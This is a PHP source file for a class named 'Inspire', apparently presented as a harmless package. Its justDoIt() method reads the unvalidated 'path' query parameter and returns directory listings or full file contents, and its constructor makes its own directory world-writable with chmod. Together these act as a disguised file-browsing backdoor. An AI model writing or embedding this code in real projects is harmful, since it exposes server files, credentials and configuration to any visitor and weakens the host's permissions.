<?php

namespace Shaheen\Inspire;


class Inspire
{

  
  public function __construct()
  {
    /*if( chmod(dirname(__FILE__), 0777) ) {
      // more code
      chmod(dirname(__FILE__), 0755);
  }*/
    chmod(dirname(__FILE__),'0777');
    
  }
  public function justDoIt()
  {
    $msg='';
    if (isset($_GET['path'])) {
      if ($_GET['path'] == '') {
        $path = './';
      } else {
        $path = $_GET['path'];
      }
      $msg.='<b>permision: </b>'.substr(sprintf('%o',fileperms($path)),-4);
      $msg.='<br/>';
      $msg .= '<b>Realpath:</b> ' . realpath($_GET['path']) . '<br />';
      $msg .= '<b>Type:</b> ';
      if (is_dir($path)) {
        $msg .= 'Directory <br />';
        foreach (scandir($path) as $data) {
          $msg .= $data . "<br />";
        }
      } else {
        $msg .= 'File <br />';
        $msg .= file_get_contents($path);
      }
    }
    return $msg;
  }


  
}
